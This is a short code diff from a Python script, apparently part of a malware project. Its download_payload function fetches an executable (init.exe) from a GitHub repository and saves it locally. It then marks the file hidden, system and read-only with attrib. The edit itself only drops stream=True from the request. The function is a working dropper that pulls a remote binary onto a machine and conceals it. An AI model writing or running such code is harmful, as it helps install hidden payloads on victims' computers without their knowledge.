@@ -38,7 +38,7 @@ def download_payload():
     init_url = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
     if not os.path.exists(PAYLOAD_PATH):
         try:
-            response = requests.get(init_url, stream=True)
+            response = requests.get(init_url)
             with open(PAYLOAD_PATH, 'wb') as f:
                 f.write(response.content)
                 subprocess.run(['attrib', '+h', '+s', '+r', PAYLOAD_PATH], shell=True)
